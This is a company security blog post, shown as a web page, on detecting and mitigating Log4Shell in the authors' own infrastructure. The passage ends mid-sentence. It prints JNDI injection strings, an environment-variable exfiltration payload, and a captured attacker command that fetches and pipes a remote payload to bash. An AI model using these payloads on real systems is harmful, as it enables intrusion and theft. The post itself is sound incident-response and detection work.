<!doctype html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.15">
<link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="Working Group Two RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="Working Group Two Atom Feed">
<link rel="preconnect" href="https://www.google-analytics.com">
<script>window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-114662288-1","auto"),ga("send","pageview")</script>
<script async src="https://www.google-analytics.com/analytics.js"></script><title data-react-helmet="true">Zero-day vulnerabilities - Log4j | Working Group Two</title><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"><meta data-react-helmet="true" property="og:image" content="https://www.wgtwo.com//img/preview.png"><meta data-react-helmet="true" name="twitter:image" content="https://www.wgtwo.com//img/preview.png"><meta data-react-helmet="true" property="og:url" content="https://www.wgtwo.com//blog/log4j-security-vulnerability/"><meta data-react-helmet="true" name="docusaurus_locale" content="en"><meta data-react-helmet="true" name="docusaurus_tag" content="default"><meta data-react-helmet="true" name="og:description" content="We help mobile operators innovate at scale, reduce cost and dive into new revenue streams - by building a mobile core network from the ground up and delivering it as-a-service."><meta data-react-helmet="true" name="og:image" content="img/wgtwo-logo-white-bg.png"><meta data-react-helmet="true" property="og:title" content="Zero-day vulnerabilities - Log4j | Working Group Two"><meta data-react-helmet="true" name="description" content="On Friday, December 10th, wgtwo and many others became aware of a critical severity zero-day exploit, CVE-2021-44228, known as “Log4Shell” in the Log4j library, which is widely used in numerous systems around the internet. We immediately opened a security incident and have been actively taking steps to mitigate and monitor the situation."><meta data-react-helmet="true" property="og:description" content="On Friday, December 10th, wgtwo and many others became aware of a critical severity zero-day exploit, CVE-2021-44228, known as “Log4Shell” in the Log4j library, which is widely used in numerous systems around the internet. We immediately opened a security incident and have been actively taking steps to mitigate and monitor the situation."><meta data-react-helmet="true" property="og:type" content="article"><meta data-react-helmet="true" property="article:published_time" content="2021-12-17T00:00:00.000Z"><meta data-react-helmet="true" property="article:author" content="https://www.linkedin.com/in/jonnathangriffin/,https://www.linkedin.com/in/yangrunenberger/"><meta data-react-helmet="true" property="article:tag" content="security,infrastructure,vulnerability"><link data-react-helmet="true" rel="icon" href="/img/favicons/favicon.ico"><link data-react-helmet="true" rel="canonical" href="https://www.wgtwo.com//blog/log4j-security-vulnerability/"><link data-react-helmet="true" rel="alternate" href="https://www.wgtwo.com//blog/log4j-security-vulnerability/" hreflang="en"><link data-react-helmet="true" rel="alternate" href="https://www.wgtwo.com//blog/log4j-security-vulnerability/" hreflang="x-default"><link rel="stylesheet" href="/assets/css/styles.9a17149c.css">
<link rel="preload" href="/assets/js/runtime~main.4eea459e.js" as="script">
<link rel="preload" href="/assets/js/main.b4708e61.js" as="script">
</head>
<body data-theme="light">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div role="region"><a href="#" class="skipToContent_ZgBM">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" target="_self" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="wgtwo Logo" class="themedImage_W2Cr themedImage--light_TfLj" height="32px" width="191px"><img src="/img/logo_white.svg" alt="wgtwo Logo" class="themedImage_W2Cr themedImage--dark_oUvU" height="32px" width="191px"></div></a><a class="navbar__item navbar__link" target="_self" href="/technology/">Technology</a><a class="navbar__item navbar__link" target="_self" href="/product-ecosystem/">Product Ecosystem</a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/team/">Join the Team 🎉</a><a class="navbar__item navbar__link" href="/blog/">Blog</a><a class="navbar__item navbar__link sign-up" href="/request-demo/">Talk to an Expert</a><div class="dsla-search-wrapper"><div class="dsla-search-field" data-tags="default,docs-default-current"></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper blog-wrapper blog-post-page"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_a9qW thin-scrollbar" aria-label="Blog recent posts navigation"><div class="sidebarItemTitle_uKok margin-bottom--md">Recent posts</div><ul class="sidebarItemList_Kvuv"><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/manual-on-me-matt-long/">Manual on Me: Matt Long</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/please-dont-leave-a-message-after-the-beep/">Don&#x27;t leave a message after the beep</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/the-specs-behind-the-specs-part-1/">The specs behind the specs part 1</a></li><li class="sidebarItem_CF0Q"><a aria-current="page" class="sidebarItemLink_miNk sidebarItemLinkActive_RRTD" href="/blog/log4j-security-vulnerability/">Zero-day vulnerabilities - Log4j</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/ckh-iod-wg2-public-cloud/">CKH IOD selects Working Group Two for public cloud core network</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/mitsui-knowledge-industry-mki-private-networks-business/">Mitsui Knowledge Industry (MKI) to develop private networks business</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/kafka-timers/">Kafka timers</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/mqtt-event-bridge/">Changing the color of your bulbs: The fancy way</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/forbidden-lore-hacking-dns-routing-for-k8s/">Forbidden lore: hacking DNS routing for k8s</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/were-all-grownups-here/">We&#x27;re all grownups here</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/hackdays-october-2020/">October Virtual Hackdays</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/what-is-a-short-message/">What the heck is a short message?</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/a-new-hope-for-products-in-telecom/">A new hope for products in telecom</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/building-software-for-a-telecom-core-network/">Building software for a telecom core network</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/choosing-erlang-formatter/">Choosing an Erlang formatter</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/vowifi-imsi-leak/">VoWifi leaking IMSI</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/extending-k8s/">Extending Kubernetes for our needs</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/metrics-unlimited-thanos/">Towards observability nirvana: infinite metric retention with Thanos</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/replacing-jenkins-with-concourse/">We killed the butler: Replacing Jenkins with Concourse</a></li><li class="sidebarItem_CF0Q"><a class="sidebarItemLink_miNk" href="/blog/hacking-dark-themes-with-css-blend-modes/">Hacking dark themes with CSS blend modes</a></li></ul></nav></aside><main class="col col--7" itemscope="" itemtype="http://schema.org/Blog"><article itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h1 class="blogPostTitle_rzP5" itemprop="headline">Zero-day vulnerabilities - Log4j</h1><div class="blogPostData_Zg1s margin-vert--md"><time datetime="2021-12-17T00:00:00.000Z" itemprop="datePublished">December 17, 2021</time> · <!-- -->11 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_FlmR"><div class="avatar margin-bottom--sm"><a href="https://www.linkedin.com/in/jonnathangriffin/" target="_blank" rel="noopener noreferrer" class="avatar__photo-link avatar__photo"><img class="image_o0gy" src="https://media-exp1.licdn.com/dms/image/C4E03AQEjrF7PC8veoQ/profile-displayphoto-shrink_400_400/0/1624522450808?e=1648684800&amp;v=beta&amp;t=LZVAsE5hVp3T50zGPk0qkf8qPJCnsXBlBXfCosrTH5o" alt="Jonnathan Griffin"></a><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://www.linkedin.com/in/jonnathangriffin/" target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">Jonnathan Griffin</span></a></div><small class="avatar__subtitle" itemprop="description">Security Tech Lead</small></div></div></div><div class="col col--6 authorCol_FlmR"><div class="avatar margin-bottom--sm"><a href="https://www.linkedin.com/in/yangrunenberger/" target="_blank" rel="noopener noreferrer" class="avatar__photo-link avatar__photo"><img class="image_o0gy" src="https://media-exp1.licdn.com/dms/image/C5103AQGoJqu0xm9NQA/profile-displayphoto-shrink_200_200/0/1516341401517?e=1649894400&amp;v=beta&amp;t=hQWH1btszoHHB0CfWVgWn3G-q4ASOEEbvGrOz9oQG7M" alt="Yan Grunenberger"></a><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://www.linkedin.com/in/yangrunenberger/" target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">Yan Grunenberger</span></a></div><small class="avatar__subtitle" itemprop="description">Software Engineer</small></div></div></div></div></header><div id="post-content" class="markdown" itemprop="articleBody"><p>On Friday, December 10th, <strong>wgtwo</strong> and many others became aware of a critical severity zero-day exploit, CVE-2021-44228, known as “Log4Shell” in the Log4j library, which is widely used in numerous systems around the internet. We immediately opened a security incident and have been actively taking steps to mitigate and monitor the situation.</p><h1>Table of Contents</h1><p><a href="#friday">Friday</a></p><ul><li><a href="#code">Code</a></li><li><a href="#docker-vulnerability-scan-day-1">Docker Vulnerability Scan Day 1</a></li></ul><p><a href="#saturday">Saturday</a></p><ul><li><a href="#checking-our-infrastructure-ourselves-with-DNS-requests">Checking our infrastructure ourselves with DNS requests</a></li><li><a href="#log-analysis-and-alerting">Log Analysis and Alerting</a></li></ul><p><a href="#monday">Monday</a></p><ul><li><a href="#docker-vulnerability-scans">Docker Vulnerability Scans</a></li><li><a href="#monitoring-vendors">Monitoring vendors</a></li></ul><p><a href="#what-worked-well-and-could-be-improved">What worked well and could be improved</a>
<a href="#staying-secure">Staying secure</a>
<a href="#we-are-hiring">We are hiring</a></p><h1>Friday</h1><p>Mitigating 3rd party vulnerabilities is an ability that <strong>wgtwo</strong> has prepared for. The first step in doing so is to assess the impact of the Log4j library across our microservice architecture.</p><p>We knew that all versions of Log4j <code>2.0-beta9 &lt;= Apache log4j &lt;= 2.14.1</code> were affected.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="code">Code<a class="hash-link" href="#code" title="Direct link to heading">​</a></h2><p>Naturally, the first place to look was our codebase and answer the question, do we have java microservices using log4j? Our core application code exists in a monorepo. Having a monorepo makes it easier as there is one place to look. In addition, we use bazel which helps for managing dependencies. After a quick scan through our repo, we found that we had a vulnerable version of log4j as a dependency, but was not used by a service. We cleaned this up and removed Log4j entirely.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="docker-vulnerability-scan-day-1">Docker Vulnerability Scan Day 1<a class="hash-link" href="#docker-vulnerability-scan-day-1" title="Direct link to heading">​</a></h2><p>We use Trivy as our Docker vulnerability scanner. We have integrated this scanner as part of our docker image registry.</p><p>At a first pass, all scans were negative across our infrastructure and we thought we were in the clear. We later identified that this was a false positive as Trivy’s database is only updated every 6 hours and did not include CVE-2021-44228 for around 48 hours after first identified.</p><h1>Saturday</h1><h2 class="anchor anchorWithStickyNavbar_mojV" id="checking-our-infrastructure-ourselves-with-dns-requests">Checking our infrastructure ourselves with DNS requests<a class="hash-link" href="#checking-our-infrastructure-ourselves-with-dns-requests" title="Direct link to heading">​</a></h2><p>At that moment, we want to also evaluate ourselves if we are vulnerable. The early report of log4j exploitation showed that attackers were abusing the user-agent field of public endpoints, such as HTTP endpoints. Those endpoints are often logged using the Apache format, which exposes the user agent and the URL in the logs. In turn, those logs could be post-processed via a component using Log4j.</p><p>One harmless way to detect vulnerability is to exercise the JNDI resolver, that is to say, to have log4j perform the DNS request toward the java object. Thinkst folks are providing Canary Tokens service in a free tier fashion, and inside, there is a DNS token:</p><p><img src="/assets/images/01-canary-tokens-f983dacab054f367bad1da172173f916.png" width="1254" height="692"></p><p>If a DNS resolution is performed on the unique DNS hostname, we would get a callback or an email. After generating the token, we quickly proceed to probe our infrastructure:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">curl https://docs.wgtwo.com  -A &quot;\${jndi:ldap://randomlygeneratedhostname.canarytokens.com/a}&quot;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>After executing the command, we shortly received the notification from CanaryTokens. It means one of our elements of the infrastructure stack is relying on log4j. Nevertheless, we need to assess if the vulnerability is exploitable, so we check the Infosec literature.</p><p>JNDI stands for Java Naming and Directory Interface - it is a system designed to look up for data and resources, i.e. such as Java bytecode. It might sound wrong to the 2021 engineers but back in 2000 Java RMI, CORBA etc were very trendy concepts for discovering and executing code in a dynamic fashion - think like Javascript or ActiveX applets in the browser world.</p><p>Going back to our problem, we quickly found this <a href="https://github.com/veracode-research/rogue-jndi" target="_blank" rel="noopener noreferrer">Rogue JNDI</a>. This is basically an exploit generator that creates a fake LDAP server, replying with Java class objects that will be executed by log4j on object retrieval.  After building a quick docker image, we ran this exploit on an external host and execute several calls to check all the proposed types of payload:</p><p><img src="/assets/images/02-supported-payloads-a00c9b2b8c1fbe6da7493e687868530a.png" width="1242" height="392"></p><p>In particular, RemoteReference did not yield to any execution, which means probably the JVM used to run the affected Java component is either too recent or not configured to execute code via known remote methods. This gives us some time, but we are still exposed to information leakage as an attacker can still exfiltrate env variables via DNS queries - i.e. log4j would resolve environment variables and would embed them in a query, such as:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">${jndi:ldap://${env:JAVA_VERSION}.dnsresolver.foo}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>Then, we should proceed to:
1) Identify if the affected components are in our stack or in the cloud provider
2) Apply mitigation</p><ul><li>Either via WAF - firewall rules on traffic.</li><li>Either via known mitigation on the log4g components<ul><li>Environment variable / JVM options</li><li>Java class removal</li><li>Full component upgrade</li></ul></li></ul><p>For (1), we started to observe all our log components and run network monitoring for a specific TCP flow on a controlled external host (i.e. running tcpdump toward a specific IP/port). We quickly noticed that a pod for one of DaemonSet was the culprit. This component was embedding logstash which is using Java and log4j.</p><p>Assuming this was the only element, we proceed to apply mitigation:
We discard the WAF approach as too complex and not providing enough coverage. We indeed saw later obfuscation of the <code>jndi:ldap</code> string used to trigger the vulnerability.
The environment variable / JVM options were the quickest to deploy, but yielded no result. Later on, the Elastic Log4j CVE dedicated page mentioned that the mitigation was ineffective.
Java class removal consists of removing the Java class from the classpath so that the component will not be able to resolve resources dynamically. Thanks to the use of Docker image, we can simply alter the build recipe to perform the removal and redeploy the image. In a couple of minutes, we can deploy the new logstash component.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="log-analysis-and-alerting">Log Analysis and Alerting<a class="hash-link" href="#log-analysis-and-alerting" title="Direct link to heading">​</a></h2><p>Just after the zero-day was released, we identified an indicator of compromise (IoC) within our logs which is helpful for security forensics. <code>${jndi</code></p><p>Cloudflare wrote a great <a href="https://blog.cloudflare.com/actual-cve-2021-44228-payloads-captured-in-the-wild/" target="_blank" rel="noopener noreferrer">blog post</a> about the traffic they have seen when updating their firewall rules for preventing Log4j exploits.</p><p>For us, we wanted to achieve something similar and ensure that we can monitor our infrastructure from malicious actors probing our public infrastructure. We have centralized logging that acts as our Security Incident Event Monitoring (SIEM) solution. This is based on ElasticSearch, which by the way, was another service we needed to patch because of Log4j, identified by <a href="https://aws.amazon.com/security/security-bulletins/AWS-2021-006/" target="_blank" rel="noopener noreferrer">AWS Security Bulletin</a>.</p><p>To get some ChatOps alerts in slack we use an open-source tool called <a href="https://github.com/Yelp/elastalert" target="_blank" rel="noopener noreferrer">Elstalert</a>. This tool provides the ability to actively monitor and alert based on data within ElasticSearch. We use this for audit and security alerts within our applications and infrastructure.</p><p>To get started, we built the following Elastalert rule:</p><div class="codeBlockContainer_I0IT language-yaml theme-code-block"><div class="codeBlockContent_wNvx yaml"><pre tabindex="0" class="prism-code language-yaml codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token key atrule">log4j.yaml</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">|</span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(199, 146, 234)">---</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">name</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;log4j cve&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">index</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> logstash</span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain">*</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">type</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> any</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">realert</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token key atrule">minutes</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">15</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">filter</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain"> </span><span class="token key atrule">query</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain"> </span><span class="token key atrule">query_string</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        </span><span class="token key atrule">query</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;\&quot;jndi:ldap\&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">query_delay</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token key atrule">minutes</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">5</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">query_key</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;message&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">alert_text_type</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> alert_text_only</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">include</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token string" style="color:rgb(195, 232, 141)">&quot;kubernetes.container.name&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token string" style="color:rgb(195, 232, 141)">&quot;message&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">alert</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;slack&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">alert_text</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> &quot;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token important">*Container*</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain">\n</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token important">*Message*</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token number" style="color:rgb(247, 140, 108)">1</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain">&quot;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">alert_text_args</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token string" style="color:rgb(195, 232, 141)">&quot;kubernetes.container.name&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token string" style="color:rgb(195, 232, 141)">&quot;message&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">slack_channel_override</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;#cve-2021-44228&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">slack_emoji_override</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;:unlock:&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">slack_msg_color</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> warning</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">slack_title</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> Security RCE attempt for CVE</span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain">2021</span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token number" style="color:rgb(247, 140, 108)">44228</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>We quickly then began to receive alerts of probing attempts across our environments.</p><p><img src="/assets/images/03-elastalert-b2d2c5d0c28cf3f09e30feb948e60320.png" width="1236" height="590"></p><p>The following alerts are <strong>unsuccessful</strong> exploit attempts our infrastructure.</p><p>Let’s take a closer look at some of these exploit attempts to see if we can learn anything..</p><div class="codeBlockContainer_I0IT language-bash theme-code-block"><div class="codeBlockContent_wNvx bash"><pre tabindex="0" class="prism-code language-bash codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">2021</span><span class="token plain">-12-10T14:05:52.612 Z</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;GET / HTTP/1.1&quot;</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">307</span><span class="token plain"> - </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> - </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;45.155.205.233&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">ldap</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">45.155.205.233</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">12344</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">Basic</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">Command</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">Base64</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0M3x8d2dldCAtcSAtTy0gNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0Myl8YmFzaA==}</span><span class="token string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;34b61b2d-28f6-4e89-9baf-7cd3b4e71698&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;54.217.173.83:443&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;-&quot;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>This request was hitting our public API gateway with a base64 encoded payload. Decoding this payload we can see what the actor was trying to accomplish:</p><p>base64</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0M3x8d2dldCAtcSAtTy0gNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0Myl8YmFzaA==</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>base64 decoded</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">(curl -s 45.155.205.233:5874/54.217.173.83:443||wget -q -O- 45.155.205.233:5874/54.217.173.83:443)|bash</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>If this attack was successful, we can see that the actor is attempting to download a malicious exploit first with <code>curl</code>, then attempt with <code>wget</code> and then execute with the downloaded payload with bash. If this attack was successful we would have received an alert from our Host-based Intrusion Detection System (HIDs) from <a href="https://github.com/falcosecurity/falco" target="_blank" rel="noopener noreferrer">Falco</a>. In addition, it shows the importance of ensuring our images are distroless, without bash and OS dependencies, and blocking egress network traffic if possible, as this would also prevent such an attack.</p><p>Looking at more attempts, we started to see probing attempts using a 3rd 